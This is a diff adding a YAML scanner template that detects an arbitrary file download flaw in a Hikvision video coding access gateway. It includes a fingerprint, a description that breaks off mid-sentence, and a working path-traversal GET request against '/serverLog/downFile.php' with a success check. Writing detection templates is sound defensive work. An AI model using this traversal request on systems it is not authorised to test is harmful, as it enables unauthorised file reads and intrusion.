@@ -1,0 +1,18 @@
+name: HIKVISION_Video_coding_equipment_Download_any_file
+transport: http
+set: {}
+detail:
+  dock: (app="Hikvision-Video-coding-device-access-gateway" || title="视频编码设备接入网关")
+  product: HIKVISION Video coding equipment
+  homepage: https://www.hikvision.com/
+  impact: <p>Download any file<br></p>
+  description: Hikvision video access gateway system in page /serverlog/downFile.php
+    There is an arbitrary file download vulnerability in the parameter filename of
+rules:
+  r1:
+    method: GET
+    path: /serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php
+    follow_redirects: true
+    headers: {}
+    expression: response.status == 200 && response.body.bcontains(b'$file_name=')
+expression: r1()
